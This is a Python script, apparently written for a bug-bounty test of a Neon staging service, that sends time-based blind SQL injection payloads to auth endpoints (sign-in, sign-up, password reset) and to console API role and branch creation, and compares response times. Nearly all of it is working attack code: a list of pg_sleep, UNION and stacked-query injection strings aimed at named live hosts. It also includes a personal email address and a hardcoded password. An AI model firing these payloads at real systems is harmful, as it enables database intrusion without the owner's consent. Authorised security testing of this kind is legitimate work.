# -*- coding: utf-8 -*-
"""V30: SQL injection time-based blind probes on auth API business fields + console params
Payloads are SELECT/pg_sleep only - no writes. Baseline timing vs payload timing."""
import json, ssl, time, http.client, statistics

ctx = ssl.create_default_context()
NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
APIKEY = json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]
PROJ = "orange-sun-90493739"
BR = "br-wandering-field-w2ob6mpn"
PASS = "SecTest!2026pass"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na_t(method, path, body=None, origin="http://localhost:3000", cookie=None):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=40, context=ctx)
    h = {"Content-Type": "application/json", "Origin": origin, "User-Agent": "Mozilla/5.0",
         "Accept": "application/json"}
    if cookie:
        h["Cookie"] = cookie
    t0 = time.time()
    conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=h)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    dt = time.time() - t0
    conn.close()
    return resp.status, data, dt


def c_t(method, path, body=None):
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=40, context=ctx)
    h = {"Content-Type": "application/json", "X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY}
    t0 = time.time()
    conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=h)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    dt = time.time() - t0
    conn.close()
    return resp.status, data, dt


def time_test(fn, tag, payloads, base_extra=0):
    """compare payload vs baseline; report if payload time significantly exceeds baseline"""
    out("-- %s --" % tag)
    for name, pay in payloads:
        st, d, dt = fn(pay)
        flag = ""
        if dt > base_extra + 2.0:
            flag = "  <== SLOW?"
        out("  %-28s -> %3d %5.2fs %s %s" % (name, st, dt, d[:60].replace("\n", " "), flag))


def main():
    out("== V30 SQLi blind probes ==")
    # ---- A. auth API fields ----
    # A1 sign-in email field (lookup: SELECT ... WHERE email=$1)
    # baseline: normal email
    st, d, dt0 = na_t("POST", "/neondb/auth/sign-in/email",
                      {"email": "libobo1229+na_org1@gmail.com", "password": "wrongpw123"})
    out("A1 baseline sign-in bad pw: %d %.2fs %s" % (st, dt0, d[:80]))
    inj = [
        ("quote", "x'"),
        ("semicolon", "x';--"),
        ("comment", "x'--"),
        ("sleep-concat", "x'||pg_sleep(3)||'"),
        ("sleep-and", "x' AND 1=(SELECT 1 FROM pg_sleep(3))--"),
        ("sleep-union", "' UNION SELECT pg_sleep(3),1,1,1,1,1,1,1,1,1,1--"),
        ("sleep-subq", "x' AND EXISTS(SELECT 1 FROM pg_sleep(3))--"),
        ("sleep-upper", "X'||PG_SLEEP(3)||'"),
        ("sleep-dollar", "x'||$$pg_sleep(3)$$||'"),
        ("backslash", "x\\'||pg_sleep(3)||'"),
        ("semicolon-sleep", "x';SELECT pg_sleep(3);--"),
        ("newline", "x'%0a||pg_sleep(3)||'"),
        ("tab", "x'%09||pg_sleep(3)||'"),
    ]
    time_test(lambda p: na_t("POST", "/neondb/auth/sign-in/email",
                             {"email": p, "password": "wrongpw123"}), "A1 sign-in email", inj, dt0)
    # A2 sign-up name + email
    import uuid
    rnd = uuid.uuid4().hex[:8]
    st, d, dt0 = na_t("POST", "/neondb/auth/sign-up/email",
                      {"name": "n%s" % rnd, "email": "libobo1229+v30%s@gmail.com" % rnd,
                       "password": PASS})
    out("A2 baseline sign-up: %d %.2fs %s" % (st, dt0, d[:80]))
    injn = [
        ("name-quote", "x'"),
        ("name-sleep", "x'||pg_sleep(3)||'"),
        ("name-sleep2", "x' AND 1=(SELECT 1 FROM pg_sleep(3))--"),
        ("email-sleep", "libobo1229+x'||pg_sleep(3)||'@gmail.com"),
        ("email-sleep2", "libobo1229+na1' AND 1=(SELECT 1 FROM pg_sleep(3))--@gmail.com"),
    ]
    for nm, p in injn:
        if nm.startswith("email"):
            body = {"name": "n%s" % rnd, "email": p, "password": PASS}
        else:
            body = {"name": p, "email": "libobo1229+v30b%s@gmail.com" % uuid.uuid4().hex[:6],
                    "password": PASS}
        st, d, dt = na_t("POST", "/neondb/auth/sign-up/email", body)
        out("  %-28s -> %3d %5.2fs %s%s" % (nm, st, dt, d[:60], "  <== SLOW?" if dt > dt0 + 2 else ""))
    # A3 password-reset email
    st, d, dt0 = na_t("POST", "/neondb/auth/request-password-reset",
                      {"email": "libobo1229+na_org1@gmail.com"})
    out("A3 baseline reset: %d %.2fs %s" % (st, dt0, d[:80]))
    time_test(lambda p: na_t("POST", "/neondb/auth/request-password-reset", {"email": p}),
              "A3 reset email", inj[:7], dt0)
    # ---- B. console params ----
    st, d, dt0 = c_t("POST", "/api/v2/projects/%s/roles" % PROJ,
                     {"role": {"name": "v30probe_%s" % uuid.uuid4().hex[:6]}})
    out("B0 console role create baseline: %d %.2fs %s" % (st, dt0, d[:60]))
    c_payloads = [
        ("role-name-quote", {"role": {"name": "x'"}}),
        ("role-name-sleep", {"role": {"name": "x'||pg_sleep(3)||'"}}),
        ("role-name-sleep2", {"role": {"name": "x';SELECT pg_sleep(3);--"}}),
        ("role-pw-sleep", {"role": {"name": "v30p_%s" % uuid.uuid4().hex[:4], "password": "x'||pg_sleep(3)||'"}}),
    ]
    for nm, b in c_payloads:
        st, d, dt = c_t("POST", "/api/v2/projects/%s/roles" % PROJ, b)
        out("  %-28s -> %3d %5.2fs %s%s" % (nm, st, dt, d[:60].replace("\n", " "),
                                             "  <== SLOW?" if dt > dt0 + 2 else ""))
    # B1 branch name
    st, d, dt0 = c_t("POST", "/api/v2/projects/%s/branches" % PROJ,
                     {"branch": {"name": "v30base_%s" % uuid.uuid4().hex[:4], "parent_id": BR}})
    bid = json.loads(d)["branch"]["id"] if st == 201 else None
    out("B1 branch create baseline: %d %.2fs" % (st, dt0))
    if bid:
        c_t("DELETE", "/api/v2/projects/%s/branches/%s" % (PROJ, bid))
    for nm, nmv in [("branch-name-quote", "x'"), ("branch-name-sleep", "x'||pg_sleep(3)||'"),
                    ("branch-name-sleep2", "x';SELECT pg_sleep(3);--")]:
        st, d, dt = c_t("POST", "/api/v2/projects/%s/branches" % PROJ,
                        {"branch": {"name": nmv, "parent_id": BR}})
        b2 = json.loads(d)["branch"]["id"] if st == 201 else None
        out("  %-28s -> %3d %5.2fs %s%s" % (nm, st, dt, d[:60].replace("\n", " "),
                                             "  <== SLOW?" if dt > dt0 + 2 else ""))
        if b2:
            c_t("DELETE", "/api/v2/projects/%s/branches/%s" % (PROJ, b2))
    out("done")


if __name__ == "__main__":
    main()
